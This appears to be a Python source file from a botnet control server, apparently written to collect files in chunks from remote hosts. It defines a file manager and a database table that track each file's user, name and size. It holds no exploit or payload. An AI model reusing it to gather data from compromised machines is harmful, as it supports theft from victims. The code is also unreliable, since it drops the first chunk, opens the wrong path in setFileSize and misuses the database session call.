from server.flaskdb import db

from threading import RLock
import os
import uuid


class BotNetFileManager:
    FILENAME_OBJFILE = 'filenames.json'

    # TODO: change to separate locks for each file
    def __init__(self,outputdir):
        '''
        Contains internal json object, doesn't need to update file for current bytes,
        only for names, close, and maxbytes
        :param outputdir: directory for storing downloads
        '''
        self.fileobjs = {}
        self.lock = RLock()
        self.outputdir = outputdir

    def checkDatabase(self):
        with self.lock:
            entries = FilenameEntry.query.all()
            for entry in entries:
                if not os.path.exists(entry.real_filename):
                    db.session.remove(entry)
            db.session.commit()

    def fileIsDownloading(self, user, filename):
        uf = (user,filename)
        with self.lock:
            if uf in self.fileobjs:
                return not self.fileobjs[uf].closed
            return False

    def fileIsDownloaded(self, user, filename):
        uf = (user, filename)
        with self.lock:
            if uf in self.fileobjs:
                return self.fileobjs[uf].closed
            else:
                entry = FilenameEntry.query.filter_by(user=user,remote_filename=filename).first()
                return entry is not None

    def appendBytesToFile(self, user, filename, wbytes):
        uf = (user, filename)
        with self.lock:
            entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
            # If this file is not in the database create an entry
            if entry is None:
                real_filename = os.path.join(self.outputdir, str(uuid.uuid4()))
                while os.path.exists(real_filename):
                    real_filename = os.path.join(self.outputdir, str(uuid.uuid4()))
                newentry = FilenameEntry(user, filename, real_filename, startcurrsize=len(wbytes))
                db.session.add(newentry)
            # If the file is in the database, change its stats
            else:
                real_filename = entry.real_filename
                if uf in self.fileobjs:
                    entry.curr_size += len(wbytes)
                else:
                    entry.curr_size = len(wbytes)
            db.session.commit()

            # If the file object hasn't been made, make it
            if uf not in self.fileobjs:
                self.fileobjs[uf] = open(real_filename, "wb")
            # Otherwise, if it isn't closed, add to it
            else:
                if not self.fileobjs[uf].closed:
                    self.fileobjs[uf].write(wbytes)

    def closeFile(self, user, filename):
        uf = (user, filename)
        with self.lock:
            if not self.fileobjs[uf].closed:
                self.fileobjs[uf].close()
            self.fileobjs.pop(uf)

    def setFileSize(self, user, filename, filesize):
        uf = (user, filename)
        with self.lock:
            entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
            if entry is None:
                real_filename = os.path.join(self.outputdir, str(uuid.uuid4()))
                while os.path.exists(real_filename):
                    real_filename = os.path.join(self.outputdir, str(uuid.uuid4()))
                newentry = FilenameEntry(user, filename, real_filename, 0, filesize)
                db.session.add(newentry)
            else:
                entry.max_size = filesize
            db.session.commit()

            if uf not in self.fileobjs:
                self.fileobjs[uf] = open(filename, "wb")

    def getFilesAndInfo(self):
        '''
        Creates a list of fileinfo objects with {user, filename, size, downloaded}
        :return:
        '''
        # Get (user,file) list
        with self.lock:
            allfiles = FilenameEntry.query.all()
            fileinfo = []
            for fileentry in allfiles:
                user = fileentry.user
                filename = fileentry.remote_filename
                downloaded = fileentry.curr_size
                size = fileentry.max_size
                fileinfo.append(dict(user=user,filename=filename,size=size,downloaded=downloaded))
            return fileinfo

    def getFileName(self, user, filename):
        uf = (user, filename)
        with self.lock:
            entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
            if entry is not None:
                return entry.real_filename
            return None

    def deleteFile(self, user, filename):
        uf = (user, filename)
        with self.lock:
            entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
            if entry is not None:
                if uf in self.fileobjs:
                    self.fileobjs[uf].close()
                real_filename = entry.real_filename
                try:
                    db.session.remove(entry)
                    os.remove(real_filename)
                except:
                    pass
                return True
            return False


class FilenameEntry(db.Model):
    __tablename__ = "Files"

    user = db.Column(db.String(40))
    remote_filename = db.Column(db.String(120))
    real_filename = db.Column(db.String(120), unique=True, primary_key=True)
    curr_size = db.Column(db.Integer)
    max_size = db.Column(db.Integer)

    def __init__(self,user,remote_filename,real_filename,startcurrsize=0,startmaxsize=0):
        self.user = user
        self.remote_filename = remote_filename
        self.real_filename = real_filename
        self.curr_size = startcurrsize
        self.max_size = startmaxsize

    def __repr__(self):
        if self.curr_size != self.max_size:
            return "<{}:{}@{} [{}/{}]>".format(self.user,self.remote_filename,
                                               self.real_filename,
                                               str(self.curr_size),str(self.max_size))
        else:
            return "<{}:{}@{}>".format(self.user,self.remote_filename,self.real_filename)